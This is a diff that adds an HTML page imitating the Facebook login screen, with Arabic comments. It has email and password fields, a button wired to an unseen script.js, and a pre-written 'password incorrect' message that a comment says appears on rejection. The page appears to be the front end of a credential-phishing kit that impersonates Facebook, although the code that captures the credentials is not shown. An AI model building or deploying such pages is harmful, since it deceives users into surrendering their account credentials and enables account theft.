@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- ربط مع ملف CSS -->
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="header">
+            <h1>Facebook</h1>
+        </div>
+
+        <div class="login-form">
+            <p class="description">With Facebook, share and stay connected with your friends.</p>
+
+            <!-- حقول الإدخال -->
+            <input type="text" id="email" placeholder="Email address or phone number" required>
+            <input type="password" id="password" placeholder="Password" required>
+
+            <!-- زر تسجيل الدخول -->
+            <button type="button" id="submit-btn">Log In</button>
+
+            <!-- الرسالة الحمراء (تظهر عند الرفض) -->
+            <div id="error-message" class="error-message" style="display: none;">
+                The password you entered is incorrect. Did you forget your password?
+            </div>
+
+            <!-- روابط -->
+            <div class="links">
+                <a href="#">Forgotten password?</a>
+            </div>
+
+            <div class="create-account">
+                <a href="#">Create a new account</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- ربط ملف JavaScript -->
+    <script src="script.js"></script>
+</body>
+</html>
